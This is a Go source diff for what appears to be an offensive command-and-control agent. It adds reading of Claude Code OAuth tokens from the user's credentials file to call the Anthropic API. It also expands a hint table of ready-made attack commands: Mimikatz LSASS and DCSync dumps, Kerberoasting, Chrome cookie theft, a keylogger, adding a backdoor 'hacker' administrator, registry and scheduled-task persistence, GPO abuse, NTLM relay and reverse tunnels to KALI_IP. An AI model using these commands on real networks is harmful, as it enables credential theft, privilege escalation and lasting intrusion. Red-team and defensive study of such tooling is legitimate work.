@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"regexp"
 	"strings"
 	"sync/atomic"
@@ -200,6 +201,67 @@ type claudeResp struct {
 	} `json:"error,omitempty"`
 }
 
+// ── Claude Code OAuth ─────────────────────────────────────────────────────
+
+type claudeCodeCreds struct {
+	ClaudeAiOauth struct {
+		AccessToken           string   `json:"accessToken"`
+		RefreshToken          string   `json:"refreshToken"`
+		ExpiresAt             int64    `json:"expiresAt"`
+		RefreshTokenExpiresAt int64    `json:"refreshTokenExpiresAt"`
+		Scopes                []string `json:"scopes"`
+		SubscriptionType      string   `json:"subscriptionType"`
+		RateLimitTier         string   `json:"rateLimitTier"`
+	} `json:"claudeAiOauth"`
+}
+
+// loadClaudeCodeToken reads the OAuth access token stored by `claude login`.
+// Returns ("", nil) if the file doesn't exist; returns an error only on parse failures.
+func loadClaudeCodeToken() (token string, expiresAt int64, err error) {
+	home, _ := os.UserHomeDir()
+	path := filepath.Join(home, ".claude", ".credentials.json")
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return "", 0, nil // file not present → OAuth not configured
+	}
+	var creds claudeCodeCreds
+	if err := json.Unmarshal(data, &creds); err != nil {
+		return "", 0, fmt.Errorf("claude credentials: %w", err)
+	}
+	return creds.ClaudeAiOauth.AccessToken, creds.ClaudeAiOauth.ExpiresAt, nil
+}
+
+// setClaudeAuth sets the correct authentication header depending on the key type:
+//   - OAuth token (sk-ant-oat*) → Authorization: Bearer
+//   - API key (sk-ant-api*)     → x-api-key
+func setClaudeAuth(req *http.Request, key string) {
+	if strings.HasPrefix(key, "sk-ant-oat") {
+		req.Header.Set("Authorization", "Bearer "+key)
+	} else {
+		req.Header.Set("x-api-key", key)
+	}
+}
+
+// resolveClaudeKey returns the effective API key for provider "claude" or "claude-code".
+// For "claude-code" it loads the OAuth token from ~/.claude/.credentials.json.
+func resolveClaudeKey(provider, apiKey string) (string, error) {
+	if provider == "claude-code" {
+		tok, exp, err := loadClaudeCodeToken()
+		if err != nil {
+			return "", fmt.Errorf("claude-code: %w", err)
+		}
+		if tok == "" {
+			return "", fmt.Errorf("claude-code: no OAuth token found — run `claude login` first")
+		}
+		// expiresAt is milliseconds
+		if exp > 0 && time.Now().UnixMilli() > exp {
+			return "", fmt.Errorf("claude-code: OAuth token expired — run `claude login` to refresh")
+		}
+		return tok, nil
+	}
+	return apiKey, nil
+}
+
 // claudeChat calls the Anthropic Messages API.
 // msgs must use role "user"/"assistant" alternating; system prompt is extracted
 // automatically from the first message with role "system".
@@ -230,7 +292,7 @@ func claudeChat(apiKey, model string, msgs []ollamaMsg) (string, error) {
 	body, _ := json.Marshal(payload)
 	req, _ := http.NewRequest("POST", "https://api.anthropic.com/v1/messages", bytes.NewReader(body))
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("x-api-key", apiKey)
+	setClaudeAuth(req, apiKey)
 	req.Header.Set("anthropic-version", "2023-06-01")
 
 	client := &http.Client{Timeout: 5 * time.Minute}
@@ -256,8 +318,12 @@ func claudeChat(apiKey, model string, msgs []ollamaMsg) (string, error) {
 
 // aiChat dispatches to Ollama or Claude based on provider.
 func aiChat(provider, ollamaURL, apiKey, model string, msgs []ollamaMsg) (string, error) {
-	if provider == "claude" {
-		return claudeChat(apiKey, model, msgs)
+	if provider == "claude" || provider == "claude-code" {
+		key, err := resolveClaudeKey(provider, apiKey)
+		if err != nil {
+			return "", err
+		}
+		return claudeChat(key, model, msgs)
 	}
 	return ollamaChat(ollamaURL, model, msgs)
 }
@@ -288,7 +354,7 @@ func claudeChatStream(apiKey, model string, msgs []ollamaMsg, cb func(tok string
 	body, _ := json.Marshal(payload)
 	req, _ := http.NewRequest("POST", "https://api.anthropic.com/v1/messages", bytes.NewReader(body))
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("x-api-key", apiKey)
+	setClaudeAuth(req, apiKey)
 	req.Header.Set("anthropic-version", "2023-06-01")
 
 	hc := &http.Client{Timeout: 5 * time.Minute}
@@ -336,8 +402,12 @@ func claudeChatStream(apiKey, model string, msgs []ollamaMsg, cb func(tok string
 
 // aiChatStream dispatches streaming to Ollama or Claude.
 func aiChatStream(provider, ollamaURL, apiKey, model string, msgs []ollamaMsg, cb func(tok string)) (string, error) {
-	if provider == "claude" {
-		return claudeChatStream(apiKey, model, msgs, cb)
+	if provider == "claude" || provider == "claude-code" {
+		key, err := resolveClaudeKey(provider, apiKey)
+		if err != nil {
+			return "", err
+		}
+		return claudeChatStream(key, model, msgs, cb)
 	}
 	return ollamaChatStream(ollamaURL, model, msgs, func(tok string, _ bool) { cb(tok) })
 }
@@ -513,34 +583,87 @@ func (cl *CLI) aiUploadsList() string {
 func asmHint(name string) string {
 	n := strings.ToLower(name)
 	switch {
+	// ── Credential / hash attacks ─────────────────────────────────────────
 	case strings.Contains(n, "rubeus"):
-		return "dotnet-exec Rubeus.exe kerberoast /outfile:hashes.txt  OR  dotnet-exec Rubeus.exe asktgt /user:u /password:p /domain:d /ptt"
-	case strings.Contains(n, "sharpHound") || strings.Contains(n, "sharphound"):
-		return "dotnet-exec SharpHound.exe -c All -d domain.local --zipfilename out.zip"
-	case strings.Contains(n, "seatbelt"):
-		return "dotnet-exec Seatbelt.exe -group=all  OR  dotnet-exec Seatbelt.exe CredEnum LocalGroups"
+		return "dotnet-exec Rubeus.exe kerberoast /outfile:hashes.txt  |  asktgt /user:u /password:p /domain:d /ptt  |  asreproast /format:hashcat /outfile:asrep.txt  |  dump /luid:0xdeadbeef  |  s4u /user:svc /rc4:HASH /impersonateuser:admin /msdsspn:cifs/TARGET /ptt"
 	case strings.Contains(n, "mimikatz"):
-		return "dotnet-exec Mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
-	case strings.Contains(n, "sharpwmi"):
-		return "dotnet-exec SharpWMI.exe action=exec computername=TARGET command=\"cmd /c whoami\""
+		return "dotnet-exec Mimikatz.exe privilege::debug sekurlsa::logonpasswords exit  |  lsadump::sam  |  lsadump::dcsync /domain:DOMAIN /user:administrator  |  token::elevate sekurlsa::logonpasswords exit"
+	case strings.Contains(n, "sharpsecdump"):
+		return "dotnet-exec SharpSecDump.exe -target=TARGET -u USER -p PASS -d DOMAIN  (remote SAM/LSA/NTDS dump — no PsExec needed)"
+	case strings.Contains(n, "sharpdpapi"):
+		return "dotnet-exec SharpDPAPI.exe triage  |  machinetriage  |  certificates /machine  |  rdg  |  blob /target:blob.bin /unprotect  |  backupkey /server:DC /file:backup.key"
+	case strings.Contains(n, "sharpdump"):
+		return "dotnet-exec SharpDump.exe  (MiniDumpWriteDump LSASS → C:\\Windows\\Temp\\debug.out — then download+parse)"
+	case strings.Contains(n, "internalmonologue"):
+		return "dotnet-exec InternalMonologue.exe  (NetNTLMv1 hashes via SSPI without admin — crack with hashcat -m 5500)"
+	case strings.Contains(n, "sharproast"):
+		return "dotnet-exec SharpRoast.exe all  (Kerberoast all SPNs, output hashcat format)"
+	case strings.Contains(n, "sharpchrome"):
+		return "dotnet-exec SharpChrome.exe logins  |  cookies --target chrome  |  history  (Chrome credential/cookie extraction)"
+	// ── Enumeration / recon ───────────────────────────────────────────────
+	case strings.Contains(n, "seatbelt"):
+		return "dotnet-exec Seatbelt.exe -group=all  |  CredEnum  LocalGroups  TokenPrivileges  UAC  DotNet  OsInfo  WindowsEventForwarding  LAPS  McAfeeSiteList  GPPPassword  PuttyHostKeys"
+	case strings.Contains(n, "sharphound"):
+		return "dotnet-exec SharpHound.exe -c All -d DOMAIN --zipfilename bh.zip  |  -c DCOnly  |  -c Session,LoggedOn  |  --stealth  |  --ldapusername USER --ldappassword PASS"
 	case strings.Contains(n, "sharpview"):
-		return "dotnet-exec SharpView.exe Get-DomainUser -Identity admin"
+		return "dotnet-exec SharpView.exe Get-DomainUser -Identity admin  |  Get-DomainGroupMember -Identity 'Domain Admins'  |  Get-DomainComputer -Properties name,dnshostname,operatingsystem  |  Find-LocalAdminAccess  |  Get-DomainTrust  |  Find-DomainShare -CheckShareAccess"
+	case strings.Contains(n, "adsearch"):
+		return "dotnet-exec ADSearch.exe --search 'objectCategory=computer' --attributes cn,operatingSystem  |  --search '(adminCount=1)' --attributes sAMAccountName  |  --search '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' (DONT_EXPIRE_PASSWORD)  |  --search '(ms-MCS-AdmPwd=*)' (LAPS)"
+	case strings.Contains(n, "adrecon"):
+		return "dotnet-exec ADRecon.exe -GenExcel  (comprehensive AD recon → Excel/CSV report in ADRecon-Report directory)"
+	case strings.Contains(n, "pingcastle"):
+		return "dotnet-exec PingCastle.exe --healthcheck --server DC_IP  |  --scanner aclcheck  |  --scanner antivirus  |  --scanner localadmin (AD risk score + detailed HTML report)"
+	case strings.Contains(n, "snaffler"):
+		return "dotnet-exec Snaffler.exe -s -o snaffler_out.log  (hunt SMB shares for creds/keys/configs/source — outputs matched files)"
+	case strings.Contains(n, "grouper"):
+		return "dotnet-exec Grouper2.exe -p  (GPO analysis for privesc — finds write permissions, logon scripts, scheduled tasks)"
 	case strings.Contains(n, "sharpup"):
-		return "dotnet-exec SharpUp.exe audit"
+		return "dotnet-exec SharpUp.exe audit  (local privesc checks: unquoted paths, weak ACLs, modifiable services, AlwaysInstallElevated, token privs)"
+	case strings.Contains(n, "sharpmapper"):
+		return "dotnet-exec SharpMapper.exe -t 10.2.20.0/24 -p 445,3389,5985,22  (port scan from agent without spawning new process)"
+	case strings.Contains(n, "sharprdp"):
+		return "dotnet-exec SharpRDP.exe computername=TARGET command='cmd /c net user hacker P@ss /add && net localgroup administrators hacker /add' username=DOMAIN\\user password=PASS"
+	case strings.Contains(n, "sharpedrchecker") || strings.Contains(n, "edrchecker"):
+		return "dotnet-exec SharpEDRChecker.exe  (detect EDR/AV by process names, drivers, services, dlls loaded — use for evasion planning)"
+	case strings.Contains(n, "sharplogger"):
+		return "dotnet-exec SharpLogger.exe  (SetWindowsHookEx keylogger — writes to C:\\Windows\\Temp\\log.txt)"
+	// ── AD CS attacks ─────────────────────────────────────────────────────
 	case strings.Contains(n, "certify"):
-		return "dotnet-exec Certify.exe find /vulnerable  OR  dotnet-exec Certify.exe request /ca:CA /template:tmpl /altname:admin"
-	case strings.Contains(n, "adpeas"):
-		return "dotnet-exec adPEAS.exe"
-	case strings.Contains(n, "winpeas"):
-		return "shell winPEAS.exe  (upload first: upload /tmp/winPEAS.exe)"
-	case strings.Contains(n, "chisel"):
-		return "shell chisel.exe client KALI_IP:PORT R:socks (then proxychains)"
-	case strings.Contains(n, "ligolo"):
-		return "shell ligolo-agent.exe -connect KALI_IP:PORT -ignore-cert"
+		return "dotnet-exec Certify.exe find /vulnerable  |  request /ca:SERVER\\CA-NAME /template:TEMPLATE /altname:administrator  |  download /ca:SERVER\\CA-NAME /id:XX  THEN: certipy-ad auth -pfx admin.pfx -dc-ip DC"
+	case strings.Contains(n, "forgecert"):
+		return "dotnet-exec ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword pass --Subject CN=FakeUser --SubjectAltName admin@DOMAIN --NewCertPath admin.pfx --NewCertPassword admin  (forge cert from stolen CA key)"
+	case strings.Contains(n, "adcspwn"):
+		return "dotnet-exec ADCSPwn.exe --adcs CA_HOST --port 80  (coerce DC auth → relay to AD CS web enrollment → DA cert)"
+	// ── AD object manipulation ────────────────────────────────────────────
+	case strings.Contains(n, "whisker"):
+		return "dotnet-exec Whisker.exe add /target:TARGET_USER /domain:DOMAIN /dc:DC  (adds msDS-KeyCredentialLink shadow cred)  THEN: dotnet-exec Rubeus.exe asktgt /user:TARGET_USER /certificate:cert.pfx /password:pass /domain:DOMAIN /ptt"
+	case strings.Contains(n, "standin"):
+		return "dotnet-exec StandIn.exe --object 'CN=TARGET,CN=Users,DC=x,DC=y' --attr msDS-KeyCredentialLink  |  --group 'Domain Admins' --ntaccount DOMAIN\\user --add  |  --computer NEWCOMP --make  |  --asrep --computer TARGET  |  --delegation  |  --removepersistence"
+	case strings.Contains(n, "sharpgpoabuse"):
+		return "dotnet-exec SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators DOMAIN\\user /add' --GPOName 'Default Domain Policy' --Force"
+	// ── Persistence ───────────────────────────────────────────────────────
+	case strings.Contains(n, "sharpersist") || strings.Contains(n, "sharppersist"):
+		return "dotnet-exec SharPersist.exe -t reg -c 'C:\\Temp\\agent.exe' -k 'hkcurun' -v 'Updater' -m add  |  -t schtask -c 'C:\\Temp\\agent.exe' -n 'WindowsUpdate' -m add  |  -t startupfolder -c 'C:\\Temp\\agent.exe' -m add  |  -t service -c 'C:\\Temp\\agent.exe' -n 'WinSvc' -m add"
+	// ── Relay / coerce ────────────────────────────────────────────────────
+	case strings.Contains(n, "krbrelay"):
+		return "dotnet-exec KrbRelay.exe -spn cifs/TARGET -clsid CLSID -rbcd ATTACKER$  |  -shadow add -shadowcreds (Kerberos relay via COM to gain RBCD or shadow creds)"
 	case strings.Contains(n, "inveigh"):
-		return "dotnet-exec Inveigh.exe  (LLMNR/NBNS/mDNS poisoner)"
-	case strings.Contains(n, "sharpcollection"), strings.Contains(n, "sharpcolle"):
-		return "dotnet-exec assembly.exe [args]"
+		return "dotnet-exec Inveigh.exe -ConsoleOutput Y -NBNS Y -mDNS Y -LLMNR Y -Challenge 1122334455667788  (capture NTLMv1/v2, crack or relay)"
+	// ── Lateral movement / execution ──────────────────────────────────────
+	case strings.Contains(n, "sharpwmi"):
+		return "dotnet-exec SharpWMI.exe action=exec computername=TARGET username=DOMAIN\\user password=PASS command='cmd /c powershell -enc BASE64'  |  action=query query='SELECT * FROM Win32_Process'"
+	case strings.Contains(n, "sharpmove"):
+		return "dotnet-exec SharpMove.exe -action exec -target TARGET -username DOMAIN\\user -password PASS -command 'cmd /c whoami > C:\\out.txt'  |  -action scm (service creation)"
+	// ── Network tunneling ─────────────────────────────────────────────────
+	case strings.Contains(n, "chisel"):
+		return "shell chisel.exe client KALI_IP:8080 R:socks  (SOCKS5 reverse tunnel — then: proxychains nxc smb TARGET)"
+	case strings.Contains(n, "ligolo"):
+		return "shell ligolo-agent.exe -connect KALI_IP:11601 -ignore-cert  (tunnel all traffic through agent — faster than chisel)"
+	// ── Comprehensive scanners ────────────────────────────────────────────
+	case strings.Contains(n, "adpeas"):
+		return "dotnet-exec adPEAS.exe  |  adPEAS.exe -Domain DOMAIN -Server DC -Username USER -Password PASS  (all-in-one AD enum: users, groups, GPO, ACL, ADCS, trusts)"
+	case strings.Contains(n, "winpeas"):
+		return "shell winPEAS.exe quiet  (local privesc — large output, use 'quiet' to reduce noise; pipe: winPEAS.exe quiet 2>&1)"
 	default:
 		return ""
 	}
